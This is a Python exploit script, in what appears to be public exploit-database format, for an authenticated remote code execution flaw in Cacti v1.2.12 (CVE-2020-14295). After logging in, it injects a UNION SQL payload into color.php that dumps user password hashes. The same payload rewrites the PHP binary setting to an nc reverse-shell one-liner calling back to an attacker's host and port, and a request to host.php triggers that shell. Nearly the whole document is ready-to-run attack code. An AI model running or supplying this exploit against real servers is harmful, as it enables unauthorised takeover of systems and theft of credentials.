# Exploit Title: Cacti v1.2.12 Authenticated Remote Code Execution
# Date: 30th April 2021
# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
# Software Link: https://www.cacti.net/
# Tested on: Cacti v1.2.12
# CVE : CVE-2020-14295


import requests
import re
import warnings
from bs4 import BeautifulSoup
import argparse
import time
import sys
from requests.utils import requote_uri




parser = argparse.ArgumentParser(description='Cacti v1.2.12 Authenticated Remote Code Execution')
parser.add_argument('-H',help='Cacti URL Eg:http://cactiurl')
parser.add_argument('-U',help='Cacti Admin Username')
parser.add_argument('-P',help='Cacti Admin Password')
parser.add_argument('-l',help='rev shell lhost')
parser.add_argument('-p',help='rev shell lport ',type=int)
args = parser.parse_args()


username = args.U
password = args.P
lhost = args.l
lport = args.p
url = args.H

#Retrieve CSRF Token

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
cacti_url = "%s/cacti" %(url)
request = requests.Session()
print("[+] Retrieving CSRF token to submit the login form")
page = request.get(cacti_url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content,features="lxml")
token = soup.findAll('input')[0].get("value").split(";")

csrf_token = token[0]

print("[+] CSRF Token : "+csrf_token)



#Login

login_info ={
            "__csrf_magic": csrf_token,
            "action":"login",
            "login_username": username,
            "login_password": password,
            "remember_me": "on"
}


login_request = request.post(cacti_url+"/index.php",login_info)


if login_request.status_code==200:
	print("[+] Login Successful")


else:

	print("Login Failed")
	print(" ")
	sys.exit()

#Exploitation

print("[+] Running Exploit")


print("[+] Performing UNION INJECTION ")


payload = "1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value=%27rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+{}+{}+%3E/tmp/f;%27+where+name=%27path_php_binary%27;--+-".format(lhost,lport)


print("[+] PAYLOAD : %s" %(payload))


url_split = url.split("/")
hostname = url_split[2]

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "https://127.0.0.1:8080",
	}
			    
cookies = {
    'cross-site-cookie': request.cookies['cross-site-cookie'],
    'Cacti': request.cookies['Cacti'],
    'cacti_remembers': request.cookies['cacti_remembers'],
    }

headers = {
    'Host': '%s' %(hostname),
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

#BURP Proxy
#stage1 = requests.get(cacti_url+"/color.php?action=export&header=false&filter=%s" %(payload),proxies=proxies,cookies=cookies,headers=headers,verify=False)

stage1 = requests.get(cacti_url+"/color.php?action=export&header=false&filter=%s" %(payload),cookies=cookies,headers=headers,verify=False)
if(stage1.status_code==200):
	print("[+] SQL INJECTION SUCCESSFUL")
	print("[+] Launching Reverse Shell!")
	stage2 = requests.get(cacti_url+"/host.php?action=reindex",cookies=cookies,headers=headers,verify=False)
	sys.exit()
	
else:
	print("Something went Wrong!")











